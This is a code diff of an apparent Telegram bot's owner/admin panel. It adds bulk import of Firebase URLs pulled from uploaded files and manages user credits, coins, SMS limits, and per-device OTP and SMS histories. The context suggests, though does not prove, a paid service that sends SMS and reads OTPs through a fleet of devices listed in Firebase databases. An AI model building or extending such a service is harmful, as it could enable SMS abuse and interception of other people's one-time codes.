-async def fb_add_start(cq: CallbackQuery, state: FSMContext):
+async def fb_add_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.add_firebase)
-    await safe_edit(cq, f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n<i>Format: Label | URL</i>",
+    await safe_edit(cq, f"🔥 <b>Add Firebase</b>\n\n<i>Format: Label | URL</i>\nOr just URL.",
                     kb([(f"{sc('cancel')}", "owner:fb:menu:0")]))
 
 @R.message(S.add_firebase)
-async def fb_add_done(m: Message, state: FSMContext):
+async def fb_add_done(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -2137,82 +2202,137 @@ async def fb_add_done(m: Message, state: FSMContext):
     else:
         url = txt; label = url.replace("https://", "").split(".")[0][:20]
     if not url.startswith("http"):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http.", parse_mode="HTML"); return
+        await m.answer(f"❌ URL must start with http.", parse_mode="HTML"); return
     url = url.rstrip("/")
     fbs = d.get("firebases", [])
     if any(fb["url"] == url for fb in fbs):
         await state.clear()
-        await m.answer(f"{em(EMOJI_WARNING, '⚠️')} Already!", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
+        await m.answer(f"⚠️ Already!", reply_markup=fb_menu_kb(d), parse_mode="HTML"); return
     fid = str(int(time.time() * 1000))
     existing = {fb["id"] for fb in fbs}
     while fid in existing: fid = str(int(time.time() * 1000) + random.randint(1000, 9999))
     fbs.append({"id": fid, "url": url, "label": label, "added_at": now_ts()})
     d["firebases"] = fbs
     save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} Added!\n{esc(label)}\n<code>{esc(url)}</code>",
+    await m.answer(f"✅ Added!\n{esc(label)}\n<code>{esc(url)}</code>",
                    reply_markup=fb_menu_kb(load()), parse_mode="HTML")
 
 @R.callback_query(F.data == "owner:fb:add_file")
-async def fb_add_file_start(cq: CallbackQuery, state: FSMContext):
+async def fb_add_file_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.add_firebase_file)
-    await safe_edit(cq, f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add</b>\n\nUpload .txt file.",
-                    kb([(f"{sc('cancel')}", "owner:fb:menu:0")]))
+    await safe_edit(cq,
+        f"📄 <b>Add Firebase via File</b>\n\n"
+        f"<i>Koi bhi file bhejo — bot URLs detect karke check karega aur add karega.</i>\n\n"
+        f"✅ Supported: .txt .json .csv .log .md .html .xml .yaml — ya koi bhi\n"
+        f"📁 Multiple files bhi bhej sakte ho (3s wait karega)\n"
+        f"🔍 URLs automatically detect honge\n"
+        f"✅ Har URL check hoga add karne se pehle",
+        kb([(f"{sc('cancel')}", "owner:fb:menu:0")]))
+
+@R.callback_query(F.data == "owner:fb:add_multi")
+async def fb_add_multi_start(cq, state):
+    d = load()
+    if not is_owner(cq.from_user.id, d):
+        try: await cq.answer("🚫")
+        except Exception: pass
+        return
+    try: await cq.answer()
+    except Exception: pass
+    await state.set_state(S.add_firebase_file)
+    await safe_edit(cq,
+        f"📁 <b>Bulk Firebase Import</b>\n\n"
+        f"Ek saath multiple files bhej sakte ho.\n"
+        f"Bot sab files me URLs dhundhega, check karega, aur add karega.\n\n"
+        f"⏱ 3 seconds baad automatic process shuru hoga.",
+        kb([(f"{sc('cancel')}", "owner:fb:menu:0")]))
 
 @R.message(S.add_firebase_file, F.document)
-async def fb_add_file_done(m: Message, state: FSMContext):
+async def fb_add_file_doc(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     doc = m.document
-    if not doc.file_name.endswith(".txt"):
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Only .txt", parse_mode="HTML"); return
+    fname = doc.file_name or "unknown"
+    content = ""
     try:
         fi = await m.bot.get_file(doc.file_id)
         downloaded = await m.bot.download_file(fi.file_path)
         raw = downloaded.read() if hasattr(downloaded, "read") else downloaded
-        content = raw.decode("utf-8", errors="ignore")
-    except Exception: await m.answer(f"{em(EMOJI_CROSS, '❌')} Read failed.", parse_mode="HTML"); return
-    fbs = d.get("firebases", [])
-    existing_urls = {fb["url"].rstrip("/") for fb in fbs}
-    existing_ids = {fb["id"] for fb in fbs}
-    added = skipped = 0; seen = set()
-    for line in content.splitlines():
-        line = line.strip()
-        if not line: continue
-        if "|" in line:
-            p = line.split("|", 1); label, url = p[0].strip(), p[1].strip()
-        else:
-            url = line; label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
-        if not (url.startswith("http://") or url.startswith("https://")): continue
-        url = url.rstrip("/")
-        if url in existing_urls or url in seen: skipped += 1; continue
-        seen.add(url); existing_urls.add(url)
-        fid = str(int(time.time() * 1000) + random.randint(10000, 99999))
-        while fid in existing_ids: fid = str(int(time.time() * 1000) + random.randint(10000, 99999))
-        existing_ids.add(fid)
-        fbs.append({"id": fid, "url": url, "label": label, "added_at": now_ts()})
-        added += 1
-    d["firebases"] = fbs; save(); await state.clear()
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} <b>Done!</b>\n\n🔥 {added}\n⚠️ {skipped}\n📊 {len(fbs)}",
-                   reply_markup=fb_menu_kb(load()), parse_mode="HTML")
+        try:
+            content = raw.decode("utf-8", errors="ignore")
+        except Exception:
+            try: content = raw.decode("latin-1", errors="ignore")
+            except Exception: content = ""
+    except Exception as e:
+        try: await m.answer(f"❌ Read failed: {esc(str(e)[:60])}", parse_mode="HTML")
+        except Exception: pass
+        return
+
+    uid = m.from_user.id
+    b = _FB_UPLOAD_BATCH.get(uid)
+    if not b:
+        b = {"files": [], "task": None, "chat_id": m.chat.id}
+        _FB_UPLOAD_BATCH[uid] = b
+    b["files"].append((fname, content))
+    b["chat_id"] = m.chat.id
+
+    # cancel old timer
+    if b.get("task") and not b["task"].done():
+        b["task"].cancel()
+
+    urls_in_file = extract_urls(content)
+    try:
+        await m.answer(
+            f"📄 <b>File received</b>\n"
+            f"📛 Name: <code>{esc(fname[:40])}</code>\n"
+            f"📦 Size: <b>{len(content)}</b> bytes\n"
+            f"🔗 URLs found: <b>{len(urls_in_file)}</b>\n\n"
+            f"📁 Queued files: <b>{len(b['files'])}</b>\n"
+            f"<i>Send more files, ya 3s wait karo process ke liye.</i>",
+            parse_mode="HTML")
+    except Exception: pass
+
+    # schedule batch
+    b["task"] = asyncio.create_task(_fb_batch_worker(m.bot, uid))
 
 @R.message(S.add_firebase_file)
-async def fb_add_file_invalid(m: Message):
-    await m.answer(f"{em(EMOJI_CROSS, '❌')} Send .txt", parse_mode="HTML")
+async def fb_add_file_other(m, state):
+    d = load()
+    if not is_owner(m.from_user.id, d):
+        await state.clear(); return
+    # if it's text with URLs, treat as text
+    if m.text:
+        urls = extract_urls(m.text)
+        if urls:
+            uid = m.from_user.id
+            b = _FB_UPLOAD_BATCH.get(uid)
+            if not b:
+                b = {"files": [], "task": None, "chat_id": m.chat.id}
+                _FB_UPLOAD_BATCH[uid] = b
+            b["files"].append((f"text_{int(time.time())}", m.text))
+            b["chat_id"] = m.chat.id
+            if b.get("task") and not b["task"].done():
+                b["task"].cancel()
+            try: await m.answer(f"📝 Text added ({len(urls)} URLs). Queued: {len(b['files'])}")
+            except Exception: pass
+            b["task"] = asyncio.create_task(_fb_batch_worker(m.bot, uid))
+            return
+    try: await m.answer(f"❌ File bhejo ya URL wala text.", parse_mode="HTML")
+    except Exception: pass
 
 @R.callback_query(F.data.startswith("owner:fb:del:"))
-async def fb_del(cq: CallbackQuery, state: FSMContext):
+async def fb_del(cq, state):
     global CACHED_DEVICES, FB_DEVICE_COUNTS, LAST_KNOWN_FB_COUNTS
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     parts = cq.data.split(":")
@@ -2223,15 +2343,14 @@ async def fb_del(cq: CallbackQuery, state: FSMContext):
     FB_DEVICE_COUNTS.pop(fid, None); LAST_KNOWN_FB_COUNTS.pop(fid, None); FB_SCAN_ERRORS.pop(fid, None)
     try: await cq.answer("🗑 Removed!")
     except Exception: pass
-    await safe_edit(cq, f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
+    await safe_edit(cq, f"🔥 <b>Firebase Manager</b>\n\nTotal: <b>{len(d['firebases'])}</b>",
                     fb_menu_kb(d, page))
 
 # ----- STATS -----
 def _api_stats(d):
     stats = d.get("stats", {}); api = stats.get("api_usage", {})
     fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
-    lines = [f"{em(EMOJI_CHART, '📊')} <b>API Stats</b>\n",
-             f"📤 Sent: <b>{stats.get('total_sent', 0)}</b>",
+    lines = [f"📊 <b>API Stats</b>\n", f"📤 Sent: <b>{stats.get('total_sent', 0)}</b>",
              f"❌ Failed: <b>{stats.get('total_failed', 0)}</b>\n", "━━━━━━━━━━━━━━━━━━━━"]
     if not api: lines.append("  😴 No usage.")
     for fid, s in api.items():
@@ -2240,76 +2359,58 @@ def _api_stats(d):
         lines.append(f"🔥 {lbl}\n   ✅ {s.get('sent', 0)} | ❌ {s.get('failed', 0)}")
     return "\n".join(lines)
 
-@R.callback_query(F.data == "owner:stats")
-async def stats_owner(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+@R.callback_query(F.data.in_({"owner:stats","admin:stats"}))
+async def stats_any(cq, state):
+    d = load(); uid = cq.from_user.id
+    is_o = is_owner(uid, d)
+    if not is_admin(uid, d):
+        try: await cq.answer("🚫")
         except Exception: pass
         return
-    try: await cq.answer()
+    try: await cq.answer("⏳")
     except Exception: pass
     devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
     if not devices:
         try: devices = await scan_all(d)
         except Exception: devices = []
     txt = _api_stats(d)
-    dl = [f"\n{em(EMOJI_CHECK, '🟢')} <b>APIs ({len(devices) * CURRENT_POWER_MODE})</b>\n"]
+    dl = [f"\n🟢 <b>APIs ({len(devices) * CURRENT_POWER_MODE})</b>\n"]
     if not devices: dl.append("  😴 None")
     for dv in devices[:30]:
         dl.append(f"  📱 {esc(str(dv.get('dev_name', ''))[:20])} — 🔥 {esc(str(dv.get('fb_label', ''))[:20])}")
     if len(devices) > 30: dl.append(f"  ...+{len(devices) - 30}")
     full = txt + "\n" + "\n".join(dl)
     if len(full) > 4000: full = full[:3990] + "\n<i>...</i>"
-    await safe_edit(cq, full,
-        kb([(f"{sc('refresh')}", "owner:stats"), (f"{sc('back')}", "owner:home")]))
-
-@R.callback_query(F.data == "admin:stats")
-async def stats_admin(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_admin(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
-        except Exception: pass
-        return
-    try: await cq.answer()
-    except Exception: pass
-    devices = CACHED_DEVICES[:] if CACHED_DEVICES else []
-    if not devices:
-        try: devices = await scan_all(d)
-        except Exception: devices = []
-    txt = _api_stats(d)
-    await safe_edit(cq, txt[:4000],
-        kb([(f"{sc('refresh')}", "admin:stats"), (f"{sc('back')}", "admin:home")]))
+    back = "owner:home" if is_o else "admin:home"
+    await safe_edit(cq, full, kb([(f"{sc('refresh')}", f"{'owner' if is_o else 'admin'}:stats"), (f"{sc('back')}", back)]))
 
 # ----- USERS LIST -----
 def _users_list(d, prefix, page=0):
     users = d.get("users", {}); items = list(users.items())
     per = 10; start = page * per; chunk = items[start:start + per]
     appr = d.get("approved", []); ban = d.get("banned", [])
-    lines = [f"{em(EMOJI_USER, '👥')} <b>Users ({len(items)})</b>\n"]
+    lines = [f"👥 <b>Users ({len(items)})</b>\n"]
     for us, ud in chunk:
         uid = int(us); nm = esc(str(ud.get("name", "?"))[:16])
-        st = em(EMOJI_CROSS, "🚫") if uid in ban else em(EMOJI_CHECK, "✅") if uid in appr \
-             else em(EMOJI_CROWN, "👑") if is_owner(uid, d) else em(EMOJI_SHIELD, "🛡") \
-             if uid in d.get("admins", []) else em(EMOJI_USER, "👤")
+        st = "🚫" if uid in ban else "✅" if uid in appr else "👑" if is_owner(uid, d) else "🛡" if uid in d.get("admins", []) else "👤"
         lines.append(f"{st} <b>{nm}</b> — 💰{ud.get('credits', 0)} 🪙{ud.get('coins', 0)} 📤{ud.get('uses', 0)}")
     rows = []
     for us, ud in chunk:
         uid = int(us); nm = str(ud.get("name", "?"))[:22]
         rows.append([btn(f"{nm} • {uid}", f"{prefix}:user:view:{uid}", EMOJI_USER, "👤")])
     nav = []
-    if page > 0: nav.append(btn("prev", f"{prefix}:users:pg:{page - 1}", EMOJI_GEAR, "◀️"))
-    if start + per < len(items): nav.append(btn("next", f"{prefix}:users:pg:{page + 1}", EMOJI_GEAR, "▶️"))
+    if page > 0: nav.append(btn("prev", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
+    if start + per < len(items): nav.append(btn("next", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
     if nav: rows.append(nav)
     rows.append([btn("back", f"{prefix}:home", EMOJI_GEAR, "🔙")])
     return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)
 
-@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
-async def users_list(cq: CallbackQuery, state: FSMContext):
+@R.callback_query(F.data.in_({"owner:users:list","admin:users:list"}))
+async def users_list(cq, state):
     d = load(); uid = cq.from_user.id
     prefix = "owner" if is_owner(uid, d) else "admin"
     if not is_admin(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2318,10 +2419,10 @@ async def users_list(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, mk)
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
-async def users_page(cq: CallbackQuery, state: FSMContext):
+async def users_page(cq, state):
     d = load(); uid = cq.from_user.id
     if not is_admin(uid, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2339,31 +2440,19 @@ def _user_detail(d, uid):
     credits = ud.get("credits", 0); coins = ud.get("coins", 0)
     uses = ud.get("uses", 0); otp_uses = ud.get("otp_uses", 0)
     joined = fmt_time(ud.get("joined_at", 0))
-    lim = get_user_send_limit(uid, d)
-    olim = get_user_otp_limit(uid, d)
+    lim = get_user_send_limit(uid, d); olim = get_user_otp_limit(uid, d)
     lim_s = "unlimited" if lim is None else ("BLOCKED" if lim <= 0 else str(lim))
     olim_s = "unlimited" if olim is None else ("BLOCKED" if olim <= 0 else str(olim))
     note = esc(str(d.get("user_notes", {}).get(k, ""))[:100])
     ban_r = esc(str(d.get("ban_reasons", {}).get(k, ""))[:100])
-    sms_hist = d.get("sms_history", {}).get(k, [])
-    otp_hist = d.get("otp_history", {}).get(k, [])
     txt = (
-        f"╭───────────────────────╮\n"
-        f"   {em(EMOJI_USER, '👤')} <b>User Details</b>\n"
-        f"╰───────────────────────╯\n"
-        f"🆔 <code>{uid}</code>\n"
-        f"👤 <b>{nm}</b>\n"
-        f"{role}\n"
+        f"👤 <b>User Details</b>\n\n"
+        f"🆔 <code>{uid}</code>\n👤 <b>{nm}</b>\n{role}\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
-        f"{em(EMOJI_COIN, '🪙')} ᴄᴏɪɴs   : <b>{coins}</b>\n"
-        f"{em(EMOJI_CHECK, '📤')} sᴍs ᴜsᴇs: <b>{uses}</b>\n"
-        f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ᴜsᴇs: <b>{otp_uses}</b>\n"
-        f"{em(EMOJI_LOCK, '🔒')} sᴍs ʟɪᴍ: <b>{lim_s}</b>\n"
-        f"{em(EMOJI_LOCK, '🔐')} ᴏᴛᴘ ʟɪᴍ: <b>{olim_s}</b>\n"
-        f"{em(EMOJI_CLOCK, '📅')} ᴊᴏɪɴᴇᴅ  : <b>{joined}</b>\n"
-        f"{em(EMOJI_STAR, '📊')} sᴍs ʜɪsᴛ: <b>{len(sms_hist)}</b>\n"
-        f"{em(EMOJI_OTP, '🔐')} ᴏᴛᴘ ʜɪsᴛ: <b>{len(otp_hist)}</b>\n"
+        f"💰 ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n🪙 ᴄᴏɪɴs   : <b>{coins}</b>\n"
+        f"📤 sᴍs ᴜsᴇs: <b>{uses}</b>\n🔐 ᴏᴛᴘ ᴜsᴇs: <b>{otp_uses}</b>\n"
+        f"🔒 sᴍs ʟɪᴍ: <b>{lim_s}</b>\n🔐 ᴏᴛᴘ ʟɪᴍ: <b>{olim_s}</b>\n"
+        f"📅 ᴊᴏɪɴᴇᴅ  : <b>{joined}</b>\n"
     )
     if note: txt += f"\n📝 <b>Note:</b> {note}"
     if ban_r: txt += f"\n🚫 <b>Ban:</b> {ban_r}"
@@ -2390,10 +2479,10 @@ def _user_detail_kb(uid, d, prefix):
     return InlineKeyboardMarkup(inline_keyboard=rows)
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):user:view:(\d+)$"))
-async def user_detail_view(cq: CallbackQuery, state: FSMContext):
+async def user_detail_view(cq, state):
     d = load(); viewer = cq.from_user.id
     if not is_admin(viewer, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2401,16 +2490,16 @@ async def user_detail_view(cq: CallbackQuery, state: FSMContext):
     p = cq.data.split(":")
     prefix = p[0]; target = int(p[3])
     if str(target) not in d.get("users", {}):
-        try: await cq.answer("❌ User not found!", show_alert=True)
+        try: await cq.answer("❌ Not found!")
         except Exception: pass
         return
     await safe_edit(cq, _user_detail(d, target), _user_detail_kb(target, d, prefix))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:smshist:(\d+)$"))
-async def user_sms_hist(cq: CallbackQuery, state: FSMContext):
+async def user_sms_hist(cq, state):
     d = load(); viewer = cq.from_user.id
     if not is_admin(viewer, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2418,9 +2507,9 @@ async def user_sms_hist(cq: CallbackQuery, state: FSMContext):
     p = cq.data.split(":"); prefix = p[0]; target = int(p[3])
     hist = d.get("sms_history", {}).get(str(target), [])
     if not hist:
-        txt = f"{em(EMOJI_CLOCK, '📜')} <b>SMS History</b>\n\nNo records."
+        txt = f"📜 <b>SMS History</b>\n\nNo records."
     else:
-        lines = [f"{em(EMOJI_CLOCK, '📜')} <b>SMS History</b> — <code>{target}</code>\n"]
+        lines = [f"📜 <b>SMS History</b> — <code>{target}</code>\n"]
         for i, e in enumerate(reversed(hist[-50:]), 1):
             ts = fmt_time(e.get("timestamp", 0))
             num = e.get("number", "?")
@@ -2433,10 +2522,10 @@ async def user_sms_hist(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, kb([(f"{sc('back')}", f"{prefix}:user:view:{target}")]))
 
 @R.callback_query(F.data.regexp(r"^(owner|admin):u:otphist:(\d+)$"))
-async def user_otp_hist(cq: CallbackQuery, state: FSMContext):
+async def user_otp_hist(cq, state):
     d = load(); viewer = cq.from_user.id
     if not is_admin(viewer, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2444,9 +2533,9 @@ async def user_otp_hist(cq: CallbackQuery, state: FSMContext):
     p = cq.data.split(":"); prefix = p[0]; target = int(p[3])
     hist = d.get("otp_history", {}).get(str(target), [])
     if not hist:
-        txt = f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b>\n\nNo records."
+        txt = f"🔐 <b>OTP History</b>\n\nNo records."
     else:
-        lines = [f"{em(EMOJI_OTP, '🔐')} <b>OTP History</b> — <code>{target}</code>\n"]
+        lines = [f"🔐 <b>OTP History</b> — <code>{target}</code>\n"]
         for i, e in enumerate(reversed(hist[-30:]), 1):
             ts = fmt_time(e.get("timestamp", 0))
             dev = esc(str(e.get("device_name", "?"))[:20])
@@ -2458,36 +2547,31 @@ async def user_otp_hist(cq: CallbackQuery, state: FSMContext):
     await safe_edit(cq, txt, kb([(f"{sc('back')}", f"{prefix}:user:view:{target}")]))
 
 @R.callback_query(F.data == "owner:users:search")
-async def user_search_start(cq: CallbackQuery, state: FSMContext):
+async def user_search_start(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
     await state.set_state(S.user_search)
-    await safe_edit(cq,
-        f"{em(EMOJI_SEARCH, '🔎')} <b>Search User</b>\n\nUser ID ya naam ka part bhejo.",
-        kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"🔎 <b>Search User</b>\n\nID ya naam:", kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.user_search)
-async def user_search_do(m: Message, state: FSMContext):
+async def user_search_do(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
     q = (m.text or "").strip().lower()
     await state.clear()
     if not q:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Empty.", parse_mode="HTML"); return
-    matches = []
-    for us, ud in d.get("users", {}).items():
-        if q in us or q in str(ud.get("name", "")).lower():
-            matches.append((int(us), ud))
+        await m.answer(f"❌ Empty.", parse_mode="HTML"); return
+    matches = [(int(us), ud) for us, ud in d.get("users", {}).items()
+               if q in us or q in str(ud.get("name", "")).lower()]
     if not matches:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} No match.",
-                       reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
-    lines = [f"{em(EMOJI_SEARCH, '🔎')} <b>Found {len(matches)}</b>\n"]
+        await m.answer(f"❌ No match.", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML"); return
+    lines = [f"🔎 <b>Found {len(matches)}</b>\n"]
     rows = []
     for uid, ud in matches[:15]:
         nm = esc(str(ud.get("name", "?"))[:22])
@@ -2496,11 +2580,11 @@ async def user_search_do(m: Message, state: FSMContext):
     rows.append([btn("back", "owner:home", EMOJI_GEAR, "🔙")])
     await m.answer("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
 
-# ----- PICK USER -----
-async def _show_pick_users(cq, state, cb_prefix, title, subtitle):
+# ----- PICK USER + ADD/DEDUCT -----
+async def _pick_users(cq, cb_prefix, title):
     d = load()
     users = list(d.get("users", {}).items())[:30]
-    lines = [f"{em(EMOJI_USER, '👥')} <b>{title}</b>\n<i>{subtitle}</i>\n"]
+    lines = [f"👥 <b>{title}</b>\n"]
     rows = []
     for us, ud in users:
         uid = int(us); nm = esc(str(ud.get("name", "?"))[:20])
@@ -2512,55 +2596,50 @@ async def _show_pick_users(cq, state, cb_prefix, title, subtitle):
     await safe_edit(cq, "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows))
 
 @R.callback_query(F.data == "owner:credits:add_pick")
-async def addcr_pick(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+async def addcr_pick(cq, state):
+    if not is_owner(cq.from_user.id, load()):
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    await _show_pick_users(cq, state, "owner:credits:add_to", "Add Credits", "Pick user")
+    await _pick_users(cq, "owner:credits:add_to", "Add Credits")
 
 @R.callback_query(F.data == "owner:credits:deduct_pick")
-async def dedcr_pick(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+async def dedcr_pick(cq, state):
+    if not is_owner(cq.from_user.id, load()):
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    await _show_pick_users(cq, state, "owner:credits:deduct_from", "Deduct Credits", "Pick user")
+    await _pick_users(cq, "owner:credits:deduct_from", "Deduct Credits")
 
 @R.callback_query(F.data == "owner:coins:add_pick")
-async def addcoin_pick(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+async def addcoin_pick(cq, state):
+    if not is_owner(cq.from_user.id, load()):
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    await _show_pick_users(cq, state, "owner:coins:add_to", "Add Coins", "Pick user")
+    await _pick_users(cq, "owner:coins:add_to", "Add Coins")
 
 @R.callback_query(F.data == "owner:coins:deduct_pick")
-async def dedcoin_pick(cq: CallbackQuery, state: FSMContext):
-    d = load()
-    if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+async def dedcoin_pick(cq, state):
+    if not is_owner(cq.from_user.id, load()):
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
     except Exception: pass
-    await _show_pick_users(cq, state, "owner:coins:deduct_from", "Deduct Coins", "Pick user")
+    await _pick_users(cq, "owner:coins:deduct_from", "Deduct Coins")
 
-# ----- ADD / DEDUCT via pick -----
 @R.callback_query(F.data.regexp(r"^owner:credits:add_to:(\d+)$"))
-async def addcr_uid(cq: CallbackQuery, state: FSMContext):
+async def addcr_uid(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2570,14 +2649,11 @@ async def addcr_uid(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.add_credits_amount)
     ud = d.get("users", {}).get(str(uid), {})
     nm = esc(str(ud.get("name", "?"))[:30]); cur = ud.get("credits", 0)
-    await safe_edit(cq,
-        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n"
-        f"User: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\n"
-        f"Kitne credits add karne hai?",
-        kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"💰 <b>Add Credits</b>\n\nUser: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\nAmount?",
+                    kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.add_credits_amount)
-async def addcr_amt(m: Message, state: FSMContext):
+async def addcr_amt(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
@@ -2585,23 +2661,22 @@ async def addcr_amt(m: Message, state: FSMContext):
         amt = int((m.text or "").strip())
         if amt <= 0: raise ValueError
     except Exception:
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number.", parse_mode="HTML"); return
+        await m.answer(f"❌ Valid positive.", parse_mode="HTML"); return
     fsmd = await state.get_data(); uid = fsmd.get("addcr_uid")
     if uid is None:
         await state.clear()
-        await m.answer(f"{em(EMOJI_CROSS, '❌')} Expired.", reply_markup=owner_kb(d), parse_mode="HTML"); return
+        await m.answer(f"❌ Expired.", reply_markup=owner_kb(d), parse_mode="HTML"); return
     add_credits(uid, amt, d, is_manual=True); save(); await state.clear()
-    try:
-        await m.bot.send_message(uid, f"{em(EMOJI_MONEY, '💰')} <b>+{amt} credits!</b>\nBalance: {get_user_credits(uid, d)}", parse_mode="HTML")
+    try: await m.bot.send_message(uid, f"💰 <b>+{amt} credits!</b>\nBalance: {get_user_credits(uid, d)}", parse_mode="HTML")
     except Exception: pass
-    await m.answer(f"{em(EMOJI_CHECK, '✅')} +{amt} credits → <code>{uid}</code>\nNew: {get_user_credits(uid, d)}",
+    await m.answer(f"✅ +{amt} → <code>{uid}</code>\nNew: {get_user_credits(uid, d)}",
                    reply_markup=owner_kb(d), parse_mode="HTML")
 
 @R.callback_query(F.data.regexp(r"^owner:credits:deduct_from:(\d+)$"))
-async def dedcr_uid(cq: CallbackQuery, state: FSMContext):
+async def dedcr_uid(cq, state):
     d = load()
     if not is_owner(cq.from_user.id, d):
-        try: await cq.answer("🚫", show_alert=True)
+        try: await cq.answer("🚫")
         except Exception: pass
         return
     try: await cq.answer()
@@ -2611,14 +2686,11 @@ async def dedcr_uid(cq: CallbackQuery, state: FSMContext):
     await state.set_state(S.deduct_credits_amount)
     ud = d.get("users", {}).get(str(uid), {})
     nm = esc(str(ud.get("name", "?"))[:30]); cur = ud.get("credits", 0)
-    await safe_edit(cq,
-        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n"
-        f"User: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\n"
-        f"Kitne deduct?",
-        kb([(f"{sc('cancel')}", "owner:home")]))
+    await safe_edit(cq, f"💰 <b>Deduct Credits</b>\n\nUser: <b>{nm}</b>\n<code>{uid}</code>\nCurrent: <b>{cur}</b>\n\nAmount?",
+                    kb([(f"{sc('cancel')}", "owner:home")]))
 
 @R.message(S.deduct_credits_amount)
-async def dedcr_amt(m: Message, state: FSMContext):
+async def dedcr_amt(m, state):
     d = load()
     if not is_owner(m.from_user.id, d):
         await state.clear(); return
